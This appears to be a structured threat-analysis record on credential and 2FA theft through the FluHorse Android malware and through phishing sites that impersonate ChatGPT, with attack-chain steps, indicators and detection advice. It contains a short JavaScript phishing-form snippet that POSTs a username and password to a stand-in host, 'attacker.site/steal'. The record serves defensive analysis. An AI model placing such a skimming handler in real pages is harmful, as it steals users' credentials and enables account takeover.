malicious_snippets.code_behavior: At runtime, the code intercepts user credentials and 2FA codes, then exfiltrates this data to an attacker-controlled server, enabling credential and authentication code theft.

malice_analysis.why_suspicious: Intercepting and exfiltrating credentials and 2FA codes is a hallmark of credential-stealing malware.
malice_analysis.violated_expectations: Legitimate applications should never send user credentials or 2FA codes to external, unauthorized servers.
malice_analysis.similar_legitimate_use: Legitimate apps may transmit credentials to their own backend for authentication, but never to unknown or attacker-controlled domains.

malicious_snippets.code_snippet:
<script>
// Pseudocode for phishing form
function onFormSubmit() {
  var user = document.getElementById('user').value;
  var pass = document.getElementById('pass').value;
  fetch('https://attacker.site/steal', {method: 'POST', body: {user, pass}});
}
</script>
malicious_snippets.code_behavior: At runtime, the code collects user credentials entered into a phishing form and sends them to an attacker-controlled server, enabling credential theft.

malice_analysis.why_suspicious: Harvesting credentials via fake login forms and exfiltrating them is a classic phishing technique.
malice_analysis.violated_expectations: Legitimate ChatGPT-related sites should not prompt for credentials outside of official authentication flows, nor send them to untrusted domains.
malice_analysis.similar_legitimate_use: Legitimate login forms send credentials to official authentication endpoints, not attacker-controlled servers.

attack_chain.action: Victim is lured to install a malicious Android app mimicking a legitimate application (FluHorse) or visit a phishing website impersonating ChatGPT.
attack_chain.leads_to: Execution of credential and 2FA code theft routines.

attack_chain.action: Malicious code executes at runtime, harvesting credentials and sensitive information.
attack_chain.leads_to: Exfiltration of stolen data to attacker-controlled infrastructure.

attack_chain.action: Exfiltrated data is used for further attacks, fraud, or sold on dark web forums.
attack_chain.leads_to: Final goal: credential compromise, account takeover, or financial theft.

behavioral_signatures: Android apps requesting excessive permissions (SMS, contacts, phone state) and sending data to untrusted domains
Websites mimicking ChatGPT or other brands with credential collection forms and outbound POST requests to non-official endpoints
file_indicators: APK files with package names similar to popular apps but signed by unknown developers
Web pages with login forms not hosted on official domains
network_indicators: Outbound connections to attacker-controlled domains (e.g., not official ChatGPT or app vendor domains)
Unusual POST requests containing credentials or 2FA codes
detection_knowledge.how_to_detect: Monitor for Android applications requesting sensitive permissions and communicating with untrusted servers. Detect web pages impersonating trusted brands and collecting credentials, especially if POST requests are sent to non-official domains. Use network monitoring to flag exfiltration of credentials or 2FA codes, and employ brand impersonation detection for phishing sites.
